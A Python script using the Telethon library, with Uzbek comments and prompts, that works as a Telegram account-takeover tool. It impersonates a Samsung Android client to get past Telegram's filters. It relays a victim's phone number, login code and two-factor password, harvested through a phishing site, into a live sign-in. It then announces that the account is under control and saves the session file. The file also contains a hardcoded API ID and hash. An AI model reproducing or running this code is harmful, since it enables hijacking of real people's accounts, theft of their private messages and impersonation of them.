
import asyncio
import sys
import os
import random
from telethon import TelegramClient, errors

# --- SOZLAMALAR (Sizning ma'lumotlaringiz) ---
API_ID = 26790161
API_HASH = '0da2c93308d6f99444c87ed7af1973fd'

# Terminal bezaklari
G = "\033[92m" # Yashil
R = "\033[91m" # Qizil
B = "\033[94m" # Ko'k
Y = "\033[93m" # Sariq
C = "\033[96m" # Havorang
RESET = "\033[0m"

async def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{C}{'='*65}")
    print(f"{B}   TELEGRAM HYPER ENGINE v6.2 - ANDROID S24 EMULATION")
    print(f"{C}{'='*65}{RESET}")

    # Rasmiy Android ilovasining qurilma ma'lumotlari
    # Bu Telegram filtrlaridan o'tish uchun juda muhim
    client = TelegramClient(
        'tg_official_session', 
        API_ID, 
        API_HASH,
        device_model="Samsung S24 Ultra",
        system_version="Android 14",
        app_version="11.1.2",
        lang_code="uz",
        system_lang_code="uz-UZ"
    )

    print(f"{Y}[!] Saytda jabrlanuvchi raqam kiritishini kuting.")
    phone = input(f"\n{G}[+] Telefon raqami (+998...): {RESET}").strip().replace(" ", "")
    if not phone.startswith('+'): phone = '+' + phone

    try:
        print(f"{B}[*] Telegram serveriga ulanmoqda...{RESET}")
        await client.connect()

        if not await client.is_user_authorized():
            print(f"{B}[*] Tekshirilmoqda: {phone}...{RESET}")
            try:
                # KOD SO'ROVI
                # force_sms=False - Bu kodni Telegram ilovasiga yuboradi
                result = await client.send_code_request(phone)
                h = result.phone_code_hash
                
                print(f"\n{G}{'='*40}")
                print(f" [V] KOD MUVAFFAQIYATLI YUBORILDI!")
                print(f" {'='*40}{RESET}")
                print(f"{C} INFO: Kod hozir jabrlanuvchining Telegramidagi")
                print(f" rasmiy 'Telegram' (ko'k belgili) chatiga bordi.")
                print(f" Agar kod kelmasa, uning internetini tekshirishni ayting.")
                print(f"{C}------------------------------------------------------------{RESET}")

                code = input(f"\n{G}[+] Saytga tushgan 5 xonali kod: {RESET}").strip()
                
                try:
                    await client.sign_in(phone, code, phone_code_hash=h)
                    print(f"\n{G}[!!!] MUVAFFAQIYATLI KIRILDI! [!!!]{RESET}")
                except errors.SessionPasswordNeededError:
                    print(f"\n{Y}[!] DIQQAT: 2-Bosqichli parol (2FA) o'rnatilgan!{RESET}")
                    pwd = input(f"{G}[+] Saytdan olingan 2FA paroli: {RESET}").strip()
                    await client.sign_in(password=pwd)
                    print(f"{G}[V] Akkaunt to'liq nazoratda!{RESET}")
                
            except errors.FloodWaitError as e:
                print(f"{R}[X] Telegram cheklovi: {e.seconds} soniya kuting.{RESET}")
                return
            except errors.PhoneNumberBannedError:
                print(f"{R}[X] Bu raqam Telegramdan ban qilingan!{RESET}")
                return
            except Exception as e:
                print(f"{R}[X] Xatolik yuz berdi: {e}{RESET}")
                return

        me = await client.get_me()
        print(f"\n{B}{'='*60}")
        print(f"{G}   AKKAUNT NAZORATGA OLINDI!{RESET}")
        print(f"   ISM: {me.first_name}")
        print(f"   USER: @{me.username if me.username else 'yoq'}")
        print(f"   ID: {me.id}")
        print(f"   Sessiya fayli: tg_official_session.session")
        print(f"{B}{'='*60}{RESET}")
        
        # Nazoratni tasdiqlash uchun xabar
        await client.send_message('me', "🚀 Tizim muvaffaqiyatli ulandi. Barcha ma'lumotlar Admin nazoratida.")

    except Exception as e:
        print(f"{R}[X] Ulanish xatosi: {e}{RESET}")
    finally:
        await client.disconnect()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{R}[!] To'xtatildi.{RESET}")
        sys.exit()
